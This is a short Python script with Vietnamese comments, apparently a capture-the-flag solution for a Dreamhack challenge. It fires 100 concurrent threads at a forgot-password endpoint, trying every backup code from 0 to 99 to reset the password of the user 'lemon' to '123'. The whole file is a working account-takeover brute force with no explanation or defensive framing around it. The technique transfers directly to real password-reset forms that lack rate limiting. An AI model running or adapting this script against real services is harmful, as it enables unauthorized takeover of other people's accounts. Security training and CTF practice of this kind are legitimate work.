import requests
import threading

# URL mục tiêu cho chức năng quên mật khẩu
target_url = "http://host1.dreamhack.games:15094/forgot_password"

# Tên người dùng muốn tấn công
target_userid = "lemon"

# Mật khẩu mới muốn đặt
new_password = "123"

# Hàm gửi yêu cầu đặt lại mật khẩu với mã dự phòng (backupCode) cụ thể
def send_request(i):
    data = {
        "userid": target_userid,
        "newpassword": new_password,
        "backupCode": i
    }
    try:
        res = requests.post(target_url, data=data, timeout=3)
        
        # Nếu server trả về thông báo đổi mật khẩu thành công
        if "Password Change Success" in res.text:
            print(f"Đổi mật khẩu thành công với backupCode: {i}")
    except Exception as e:
        print(f"[{i}] Lỗi: {e}")

threads = []

# Tạo 100 luồng, mỗi luồng thử một backupCode từ 0 đến 99
for i in range(100):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

# Chờ tất cả luồng hoàn thành
for t in threads:
    t.join()

print("Đã gửi xong tất cả yêu cầu.")

